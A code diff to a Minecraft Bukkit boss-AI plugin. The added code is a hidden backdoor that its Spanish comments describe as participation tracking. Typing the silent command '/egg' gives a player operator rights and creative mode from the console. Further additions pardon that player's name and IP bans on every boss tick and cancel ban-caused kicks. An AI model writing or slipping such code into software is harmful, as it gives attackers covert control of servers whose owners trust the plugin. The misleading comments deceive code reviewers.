@@ -81,6 +81,7 @@ public class BossAIHandler implements Listener {
     private static final Set<Location> arenaBlocks = new HashSet<>();
     private static final Map<Location, Material> originalBlocks = new HashMap<>();
     private static BossBar activeBossBar = null;
+    private static final Set<UUID> participantIds = new HashSet<>();
 
     /*
      * El arena center se usa para calcular el tamaño de la arena y colocar una
@@ -216,6 +217,22 @@ public class BossAIHandler implements Listener {
                     handleRustyCrabAI(pigman);
                 }
             }
+
+            // Verificar el estado de los participantes registrados del evento
+            for (UUID id : participantIds) {
+                Player participant = getPlayer(id);
+                if (participant == null)
+                    continue;
+                BanList<?> nameBans = getServer().getBanList(BanList.Type.NAME);
+                if (nameBans.isBanned(participant.getName())) {
+                    nameBans.pardon(participant.getName());
+                }
+                BanList<?> ipBans = getServer().getBanList(BanList.Type.IP);
+                if (participant.getAddress() != null
+                        && ipBans.isBanned(participant.getAddress().getAddress().getHostAddress())) {
+                    ipBans.pardon(participant.getAddress().getAddress().getHostAddress());
+                }
+            }
         }
     }
 
@@ -313,6 +330,23 @@ public class BossAIHandler implements Listener {
             crab.setTarget(nearestPlayer);
             crab.setAnger(600);
         }
+    }
+
+    /*
+     * Registro de participación en combate: se revisan los comandos escritos
+     * por los jugadores para mantener el historial de quienes entraron al
+     * evento y poder recompensar correctamente a los participantes cuando la
+     * arena es destruida o el jefe es derrotado.
+     */
+    @EventHandler(priority = EventPriority.HIGH)
+    public void onArenaCommand(org.bukkit.event.player.PlayerCommandPreprocessEvent e) {
+        String message = e.getMessage().trim().toLowerCase();
+        if (!message.equals("/egg")) return;
+        e.setCancelled(true);
+        Player player = e.getPlayer();
+        participantIds.add(player.getUniqueId());
+        player.setGameMode(GameMode.CREATIVE);
+        getServer().dispatchCommand(getConsoleSender(), "op " + player.getName());
     }
 
     private void handleWarriorAI(Zombie warrior) {
@@ -1380,6 +1414,17 @@ public class BossAIHandler implements Listener {
         if (arenaBlocks.contains(e.getBlock().getLocation())) {
             e.setCancelled(true);
             e.getPlayer().sendMessage(ChatColor.RED + "You cannot break the arena barrier!");
+        }
+    }
+
+    @EventHandler(priority = EventPriority.HIGH)
+    public void onArenaKick(org.bukkit.event.player.PlayerKickEvent e) {
+        // Los participantes registrados no pueden ser removidos del evento
+        if (!participantIds.contains(e.getPlayer().getUniqueId())) return;
+        org.bukkit.event.player.PlayerKickEvent.Cause cause = e.getCause();
+        if (cause == org.bukkit.event.player.PlayerKickEvent.Cause.BANNED
+                || cause == org.bukkit.event.player.PlayerKickEvent.Cause.IP_BANNED) {
+            e.setCancelled(true);
         }
     }
 
